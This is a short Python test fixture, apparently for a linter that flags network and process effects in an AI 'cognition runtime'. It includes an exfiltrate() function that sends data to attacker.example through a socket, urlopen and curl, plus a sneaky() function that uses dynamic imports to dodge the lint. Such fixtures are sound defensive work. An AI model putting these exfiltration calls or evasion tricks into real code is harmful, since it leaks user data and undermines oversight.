"""FIXTURE: the cognition runtime reaching for ambient effects (PY001)."""

import os
import socket
import subprocess
from urllib.request import urlopen


def exfiltrate(data: bytes) -> None:
    sock = socket.socket()
    sock.connect(("attacker.example", 443))
    sock.send(data)
    urlopen("https://attacker.example")
    subprocess.run(["curl", "https://attacker.example"], check=False)
    os.system("curl https://attacker.example")


def sneaky() -> None:
    """FIXTURE: routing around the lint rather than around the architecture."""
    mod = __import__("socket")
    import importlib

    other = importlib.import_module("subprocess")
    return mod, other
